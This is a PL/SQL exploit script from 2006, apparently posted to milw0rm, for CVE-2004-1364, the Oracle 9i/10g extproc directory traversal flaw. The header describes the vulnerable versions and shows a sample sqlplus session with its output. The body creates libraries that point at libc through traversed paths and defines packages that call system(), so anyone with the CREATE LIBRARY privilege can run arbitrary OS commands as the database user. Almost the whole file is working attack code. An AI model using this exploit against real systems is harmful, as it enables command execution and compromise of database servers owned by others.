--
-- $Id: raptor_oraextproc.sql,v 1.1 2006/12/19 14:21:00 raptor Exp $
--
-- raptor_oraextproc.sql - command exec via oracle extproc
-- Copyright (c) 2006 Marco Ivaldi <raptor@0xdeadbeef.info>
--
-- Directory traversal vulnerability in extproc in Oracle 9i and 10g 
-- allows remote attackers to access arbitrary libraries outside of the 
-- $ORACLE_HOME\bin directory (CVE-2004-1364).
--
-- This PL/SQL code exploits the Oracle extproc directory traversal bug
-- to remotely execute arbitrary OS commands with the privileges of the DBMS 
-- user (the CREATE [ANY] LIBRARY privilege is needed).
--
-- See also: 
-- http://www.0xdeadbeef.info/exploits/raptor_oraexec.sql
-- http://www.0xdeadbeef.info/exploits/raptor_orafile.sql
--
-- Vulnerable platforms:
-- Oracle 9i (all versions?)
-- Oracle 10g versions prior to 10.1.0.3
--
-- Tested on Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production,
-- running on both Solaris 9 and 10 systems. It will need some tweakings to 
-- properly work on other platforms.
--
-- Usage example:
-- $ echo $ORACLE_HOME
-- /opt/oracle/
-- $ sqlplus "/ as sysdba"
-- [...]
-- Connected to:
-- Oracle9i Enterprise Edition Release 9.2.0.1.0 - 64bit Production
-- With the Partitioning, OLAP and Oracle Data Mining options
-- JServer Release 9.2.0.1.0 - Production
-- SQL> @raptor_oraextproc.sql
-- [...]
-- exec oracmd32.exec('touch /tmp/32');
-- [...]
-- ERROR at line 1:
-- ORA-06520: PL/SQL: Error loading external library
-- ORA-06522: ld.so.1: extprocPLSExtProc: fatal:
-- /opt/oracle/bin/../../../../../../../lib/32/libc.so.1: wrong ELF class:
-- ELFCLASS32
-- [...]
-- SQL> exec oracmd64.exec('touch /tmp/64');
-- SQL> !ls -l /tmp/64
-- -rw-r--r--   1 oracle   orainst        0 Dec 19 13:49 /tmp/64
--

-- library for 32-bit oracle releases
create or replace library exec_shell32 as
'$ORACLE_HOME/bin/../../../../../../../lib/32/libc.so.1';
/

-- library for 64-bit oracle releases
create or replace library exec_shell64 as
'$ORACLE_HOME/bin/../../../../../../../lib/64/libc.so.1';
/

-- package for 32-bit oracle releases
-- usage: exec oracmd32.exec('command');
create or replace package oracmd32 as
	procedure exec(cmdstring in char);
end oracmd32;
/
create or replace package body oracmd32 as
	procedure exec(cmdstring in char)
	is external
	name "system"
	library exec_shell32
	language c;
end oracmd32;
/

-- package for 64-bit oracle releases
-- usage: exec oracmd64.exec('command');
create or replace package oracmd64 as
	procedure exec(cmdstring in char);
end oracmd64;
/
create or replace package body oracmd64 as
	procedure exec(cmdstring in char)
	is external
	name "system"
	library exec_shell64
	language c;
end oracmd64;
/

-- milw0rm.com [2006-12-19]
